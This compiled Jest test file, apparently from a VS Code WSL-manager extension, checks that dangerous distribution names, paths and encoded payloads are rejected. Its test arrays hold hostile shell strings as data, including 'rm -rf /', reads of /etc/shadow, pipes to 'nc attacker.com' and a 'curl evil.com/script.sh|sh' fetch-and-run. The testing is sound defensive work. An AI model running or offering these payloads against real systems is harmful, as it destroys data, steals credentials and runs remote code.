"use strict";
/**
 * Security-focused tests to verify protection against common attacks
 * Tests command injection, path traversal, and input sanitization
 */
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
Object.defineProperty(exports, "__esModule", { value: true });
const wslManager_1 = require("../../src/wslManager");
const inputValidator_1 = require("../../src/utils/inputValidator");
const securityValidator_1 = require("../../src/security/securityValidator");
const vscode = __importStar(require("vscode"));
// Mock modules
jest.mock('vscode');
jest.mock('child_process');
jest.mock('fs');
describe('Security Tests', () => {
    let wslManager;
    let securityValidator;
    beforeEach(() => {
        wslManager = new wslManager_1.WSLManager();
        securityValidator = securityValidator_1.SecurityValidator.getInstance();
        securityValidator.resetRateLimits();
        // Mock vscode workspace
        vscode.workspace.isTrusted = true;
        vscode.workspace.getConfiguration.mockReturnValue({
            get: jest.fn().mockReturnValue([])
        });
        jest.clearAllMocks();
    });
    describe('Command Injection Prevention', () => {
        const dangerousInputs = [
            '; rm -rf /',
            '&& cat /etc/passwd',
            '| nc attacker.com 1234',
            '`whoami`',
            '$(id)',
            '${HOME}',
            'test\necho hacked',
            'test\r\necho hacked',
            'test; echo hacked',
            'test && echo hacked',
            'test || echo hacked',
            'test > /dev/null',
            'test < /etc/passwd',
            'test 2>&1',
            '--unregister test; rm -rf /',
            'test$(echo hacked)',
            'test`echo hacked`',
            'test${IFS}hacked',
            'test;$(curl evil.com/script.sh|sh)',
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            'C:\\Windows\\System32\\cmd.exe'
        ];
        it('should reject all dangerous distribution names', async () => {
            for (const dangerous of dangerousInputs) {
                await expect(wslManager.createDistribution(dangerous, 'Ubuntu')).rejects.toThrow(/Invalid distribution name/);
                await expect(wslManager.importDistribution(dangerous, '/path/to/file.tar')).rejects.toThrow(/Invalid distribution name/);
                await expect(wslManager.unregisterDistribution(dangerous)).rejects.toThrow(/Invalid distribution name/);
            }
        });
        it('should reject dangerous file paths', async () => {
            const pathAttacks = [
                '../../etc/passwd',
                '../../../sensitive/data',
                'C:\\Windows\\System32\\config\\SAM',
                '/etc/shadow',
                '~/../../etc/passwd',
                '${HOME}/sensitive',
                '$(pwd)/../../etc',
                '/tmp/file;rm -rf /',
                '/tmp/file|cat',
                '/tmp/file>output',
                '/tmp/file<input'
            ];
            for (const dangerous of pathAttacks) {
                await expect(wslManager.importDistribution('test', dangerous)).rejects.toThrow(/Invalid TAR file path/);
                await expect(wslManager.exportDistribution('test', dangerous)).rejects.toThrow(/Invalid export path/);
            }
        });
        it('should sanitize command parameters in executeInDistribution', async () => {
            const dangerousCommands = [
                'ls; rm -rf /',
                'echo test && cat /etc/passwd',
                'whoami | nc attacker.com 1234',
                'echo $(cat /etc/shadow)',
                'echo `id`'
            ];
            for (const cmd of dangerousCommands) {
                // The command should be passed safely through sh -c
                // WSLManager doesn't directly validate the command content
                // but relies on proper escaping in CommandBuilder
                const result = await wslManager.runCommand('Ubuntu', cmd);
                // The command itself isn't rejected, but it's properly escaped
                // to prevent injection when passed to sh -c
            }
        });
    });
    describe('Path Traversal Prevention', () => {
        it('should prevent path traversal in import paths', async () => {
            const traversalAttempts = [
                { base: '/allowed/path', input: '../../../etc/passwd' },
                { base: 'C:\\WSL\\Distros', input: '..\\..\\Windows\\System32' },
                { base: '/home/user/wsl', input: '../../root/.ssh/id_rsa' }
            ];
            for (const attempt of traversalAttempts) {
                const validation = inputValidator_1.InputValidator.validateFilePath(attempt.input, {
                    basePath: attempt.base
                });
                expect(validation.isValid).toBe(false);
                expect(validation.error).toContain('Path traversal detected');
            }
        });
        it('should normalize paths to prevent tricks', () => {
            const pathTricks = [
                '/path/./to/./file',
                '/path//to///file',
                '/path/to/../to/file',
                'C:\\path\\..\\path\\file'
            ];
            pathTricks.forEach(trick => {
                const validation = inputValidator_1.InputValidator.validateFilePath(trick);
                if (validation.isValid) {
                    // Path should be normalized
                    expect(validation.sanitizedValue).not.toContain('/./');
                    expect(validation.sanitizedValue).not.toContain('//');
                    expect(validation.sanitizedValue).not.toContain('/../');
                }
            });
        });
    });
    describe('Rate Limiting', () => {
        it('should enforce rate limits to prevent abuse', async () => {
            // Simulate rapid import attempts
            const promises = [];
            for (let i = 0; i < 10; i++) {
                promises.push(wslManager.importDistribution(`test${i}`, `/tmp/test${i}.tar`, `/tmp/test${i}`).catch(err => err.message));
            }
            const results = await Promise.all(promises);
            // First 5 should succeed (rate limit for import is 5/min)
            const failures = results.filter(r => typeof r === 'string' && r.includes('Rate limit exceeded'));
            expect(failures.length).toBeGreaterThan(0);
        });
        it('should have different limits for different operations', async () => {
            // Test that different operations have independent rate limits
            // List operation (60/min limit)
            for (let i = 0; i < 10; i++) {
                await wslManager.listDistributions();
            }
            // Should still work
            // Create operation (10/min limit)
            const createPromises = [];
            for (let i = 0; i < 15; i++) {
                createPromises.push(wslManager.createDistribution(`test${i}`, 'Ubuntu')
                    .catch(err => err.message));
            }
            const createResults = await Promise.all(createPromises);
            const createFailures = createResults.filter(r => typeof r === 'string' && r.includes('Rate limit exceeded'));
            expect(createFailures.length).toBeGreaterThan(0);
        });
    });
    describe('Input Sanitization', () => {
        it('should sanitize display output', () => {
            const maliciousOutputs = [
                'Normal\x00Null\x00Byte',
                'Control\x1bCharacters',
                'Bell\x07Character',
                'Carriage\rReturn',
                'Vertical\x0bTab',
                'Form\x0cFeed'
            ];
            maliciousOutputs.forEach(output => {
                const sanitized = inputValidator_1.InputValidator.sanitizeForDisplay(output);
                // Should not contain control characters
                expect(sanitized).not.toMatch(/[\x00-\x1F\x7F]/);
            });
        });
        it('should truncate extremely long inputs', () => {
            const longInput = 'a'.repeat(10000);
            const sanitized = inputValidator_1.InputValidator.sanitizeForDisplay(longInput, 100);
            expect(sanitized.length).toBe(100);
            expect(sanitized).toEndWith('...');
        });
    });
    describe('Permission Checks', () => {
        it('should check permissions for destructive operations', async () => {
            // Mock permission denial
            vscode.window.showWarningMessage.mockResolvedValue('No');
            await expect(wslManager.unregisterDistribution('test')).rejects.toThrow('Operation cancelled by user');
            expect(vscode.window.showWarningMessage).toHaveBeenCalled();
        });
        it('should respect workspace trust settings', async () => {
            vscode.workspace.isTrusted = false;
            const permission = await securityValidator.checkPermission('delete');
            expect(permission).toBe(false);
        });
    });
    describe('Audit Logging', () => {
        it('should log security-relevant events', async () => {
            // Enable security logging
            vscode.workspace.getConfiguration.mockReturnValue({
                get: jest.fn((key) => key === 'enableSecurityLogging' ? true : [])
            });
            const consoleSpy = jest.spyOn(console, 'log').mockImplementation();
            // Attempt a delete operation
            try {
                await wslManager.unregisterDistribution('test-distro');
            }
            catch {
                // Expected to fail in test environment
            }
            // Should have logged the security event
            expect(consoleSpy).toHaveBeenCalledWith(expect.stringContaining('[Security Audit]'), expect.any(String));
            consoleSpy.mockRestore();
        });
    });
    describe('Encoded Payload Detection', () => {
        it('should detect and block encoded malicious payloads', async () => {
            const encodedPayloads = [
                // Base64 encoded 'rm -rf /'
                Buffer.from('rm -rf /').toString('base64'),
                // Hex encoded dangerous command
                '726d202d7266202f',
                // URL encoded shell command
                'test%3B%20rm%20-rf%20%2F',
                // Double encoded
                '%25%33%42%25%32%30%72%6D%25%32%30%2D%72%66%25%32%30%25%32%46'
            ];
            for (const payload of encodedPayloads) {
                const context = {
                    command: 'import',
                    args: ['--import', payload, '/path'],
                    timestamp: Date.now()
                };
                const result = await securityValidator.validateCommand(context);
                expect(result.allowed).toBe(false);
                expect(result.reason).toContain('encoded payload');
            }
        });
    });
    describe('Null Byte Injection', () => {
        it('should prevent null byte injection attacks', async () => {
            const nullByteAttacks = [
                'test\x00.txt',
                'safe.tar\x00.sh',
                'file\u0000name'
            ];
            for (const attack of nullByteAttacks) {
                const validation = inputValidator_1.InputValidator.validateFilePath(attack);
                expect(validation.isValid).toBe(false);
                expect(validation.error).toContain('invalid characters');
            }
        });
    });
    describe('Reserved Name Protection', () => {
        it('should prevent use of reserved system names', () => {
            const reservedNames = ['wsl', 'WSL', 'windows', 'WINDOWS', 'system', 'SYSTEM', 'root', 'ROOT', 'admin', 'ADMIN'];
            reservedNames.forEach(name => {
                const validation = inputValidator_1.InputValidator.validateDistributionName(name);
                expect(validation.isValid).toBe(false);
                expect(validation.error).toContain('reserved');
            });
        });
    });
    describe('Integration Security', () => {
        it('should handle combined attack vectors', async () => {
            // Combine multiple attack techniques
            const combinedAttacks = [
                'test;echo${IFS}hacked',
                '../test$(whoami)',
                'test\x00;rm -rf /',
                Buffer.from('test;cat /etc/passwd').toString('base64')
            ];
            for (const attack of combinedAttacks) {
                // Should be rejected at multiple levels
                const nameValidation = inputValidator_1.InputValidator.validateDistributionName(attack);
                expect(nameValidation.isValid).toBe(false);
                const pathValidation = inputValidator_1.InputValidator.validateFilePath(attack);
                expect(pathValidation.isValid).toBe(false);
            }
        });
    });
});
//# sourceMappingURL=security.test.js.map